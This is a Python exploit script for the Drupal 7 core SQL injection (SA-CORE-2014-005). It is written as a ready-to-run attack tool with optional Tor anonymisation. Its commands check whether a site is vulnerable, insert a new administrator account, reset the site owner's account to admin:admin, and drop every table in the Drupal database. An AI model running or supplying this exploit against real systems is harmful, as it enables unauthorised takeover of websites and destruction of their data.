import hashlib
import os
import random
import socket
import sys
import urllib2

import socks

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36'}

COMMAND = None
TARGET, USER, PASS, TOR = None, None, None, False
TOR_PROXY, TOR_PORT = "127.0.0.1", 9050


class DrupalHash:
    def __init__(self):
        self.itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        self.default_log = 15

    def password_crypt(self, algo, password, setting):
        setting = setting[0:12]
        salt = setting[4:12]
        count = 1 << self.itoa64.index(setting[3])
        hash_str = hashlib.sha512(salt + password).digest()
        for c in range(count):
            hash_str = hashlib.sha512(hash_str + password).digest()
        return (setting + self.custom64(hash_str))[:55]

    def custom64(self, string):
        count = len(string)
        output = ''
        i = 0
        itoa64 = self.itoa64
        while 1:
            value = ord(string[i])
            i += 1
            output += itoa64[value & 0x3f]
            if i < count:
                value |= ord(string[i]) << 8
            output += itoa64[(value >> 6) & 0x3f]
            if i >= count:
                break
            i += 1
            if i < count:
                value |= ord(string[i]) << 16
            output += itoa64[(value >> 12) & 0x3f]
            if i >= count:
                break
            i += 1
            output += itoa64[(value >> 18) & 0x3f]
            if i >= count:
                break
        return output

    def user_hash_password(self, password):
        return self.password_crypt('sha512', password, '$S$DW34Na/1A')


def usage():
    print
    print "Usage", os.path.basename(sys.argv[0]), "[COMMAND] [OPTIONS]"
    print ''' 
Advisory : SA-CORE-2014-005 - Drupal core - SQL injection
           https://www.drupal.org/SA-CORE-2014-005

Commands:
    check         : Check if the target is vulnerable
    adduser       : Add custom user
    pwn           : Change the account with uid 1 to admin:admin
    clean         : Drop all tables of Drupal database

Options:
    -h, --help    : Help !
    --tor         : Use tor socks proxy (localhost:9050)
    -t, --target  : Drupal 7 website address (http://xxx.xxx/)
    -u, --user    : Username
    -p, --pass    : Password

Examples:
    drupal.py check -t http://xxx.xxx/
    drupal.py adduser -t http://xxx.xxx/ -u bob -p bobpass
    drupal.py pwn -t http://xxx.xxx/
    drupal.py clean -t http://xxx.xxx/
'''
    sys.exit(1)


def create_connection(address, timeout=None, source_address=None):
    sock = socks.socksocket()
    sock.connect(address)
    return sock


def tor():
    print "[+] Setting tor proxy (127.0.0.1:9050)"
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, TOR_PROXY, TOR_PORT)
    socket.socket = socks.socksocket
    socket.create_connection = create_connection


def enc(s):
    for i in [[" ", "+"], ["(", "%28"], [")", "%29"], ["=", "%3D"]]:
        s = s.replace(i[0], i[1])
    return s


def execute(request):
    try:
        data = "name[0;" + enc(request) + ";#]=1&name[0]=1&pass=1&form_build_id=&form_id=user_login_block&op=Log+in"
        req = urllib2.Request(TARGET + "?q=node&destination=node", data, headers)
        return urllib2.urlopen(req).read().find("mb_strlen()") > 1
    except:
        print "[!] Unable to connect to", TARGET
        sys.exit(1)


def check():
    print "[+] Checking the website"
    print "[+] VULNERABLE" if execute("select 1;") else "[+] Not vulnerable"


def adduser():
    hash = DrupalHash()
    print "[+] Adding user", USER + ":" + PASS
    uid = random.randrange(1264)
    print "[+] Done" if execute("insert into users (uid, name, pass, status) values (%d, '%s', '%s', %d);" % (
    uid, USER, hash.user_hash_password(PASS), 1)) else "[+] Failed"
    print "[+] Setting administrator role ID for", USER
    print "[+] Done" if execute("insert into users_roles (uid, rid) values (%d, %d);" % (uid, 3)) else "[+] Failed"


def pwn():
    hash = DrupalHash()
    print "[+] Changing default account to admin:admin"
    print "[+] Done" if execute("update users set name = 'admin', pass = '" + hash.user_hash_password(
        "admin") + "' where uid = '1';") else "[+] Failed"


def clean():
    print "[+] Removing tables of Drupal database"
    execute(
        "DROP TABLE actions, authmap, batch, block, blocked_ips, block_custom, block_node_type, block_role, cache, cache_block, cache_bootstrap, cache_field, cache_filter, cache_form, cache_image, cache_menu, cache_page, cache_path, cache_update, comment, date_formats, date_format_locale, date_format_type, field_config, field_config_instance, field_data_body, field_data_comment_body, field_data_field_image, field_data_field_tags, field_revision_body, field_revision_comment_body, field_revision_field_image, field_revision_field_tags, file_managed, file_usage, filter, filter_format, flood, history, image_effects, image_styles, menu_custom, menu_links, menu_router, node, node_access, node_comment_statistics, node_revision, node_type, queue, rdf_mapping, registry, registry_file, role, role_permission, search_dataset, search_index, search_node_links, search_total, semaphore, sequences, sessions, shortcut_set, shortcut_set_users, system, taxonomy_index, taxonomy_term_data, taxonomy_term_hierarchy, taxonomy_vocabulary, url_alias, users, users_roles, variable, watchdog;")
    print "[+] Done"


def options():
    global COMMAND, TARGET, USER, PASS, TOR
    if len(sys.argv) > 1 and sys.argv[1] in ("adduser", "check", "pwn", "clean"):
        COMMAND = sys.argv[1]
    o = 2
    while o < len(sys.argv):
        arg = sys.argv[o]
        try:
            if arg in ("-h", "--help"):
                usage()
            elif arg in ("-t", "--target"):
                TARGET = sys.argv[o + 1]
                if TARGET[-1] != "/":
                    TARGET += "/"
                o += 1
            elif arg in ("-u", "--user"):
                USER = sys.argv[o + 1]
                o += 1
            elif arg in ("-p", "--pass"):
                PASS = sys.argv[o + 1]
                o += 1
            elif arg in ("--tor"):
                TOR = True
            o += 1
        except:
            usage()


if __name__ == "__main__":
    options()
    if COMMAND and TOR:
        tor()
    if COMMAND == "check" and TARGET:
        check()
    elif COMMAND == "adduser" and TARGET and USER and PASS:
        adduser()
    elif COMMAND == "pwn" and TARGET:
        pwn()
    elif COMMAND == "clean" and TARGET:
        clean()
    else:
        usage()
